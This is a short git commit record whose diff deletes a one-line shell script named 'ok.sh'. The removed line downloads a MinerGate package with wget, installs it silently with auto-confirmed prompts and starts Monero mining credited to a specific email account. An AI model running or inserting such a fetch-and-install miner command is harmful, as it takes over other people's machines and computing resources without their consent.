0e1f21639bca8e3d1514bad6964bbba4215116da
ba3walos99 <38079309+ba3walos99@users.noreply.github.com>
2019-05-30 03:20:08 +0200

    Delete ok.sh

--- ok.sh
+++
@@ -1,1 +0,0 @@
-wget https://minergate.com/download/xfast-ubuntu-cli-amd && mv xfast-ubuntu-cli-amd minergate-cli-release.deb && apt-get -y update && apt-get -y install gdebi && yes Y | gdebi minergate-cli-release.deb && minergate-cli -u mgrate888@gmail.com --xmr
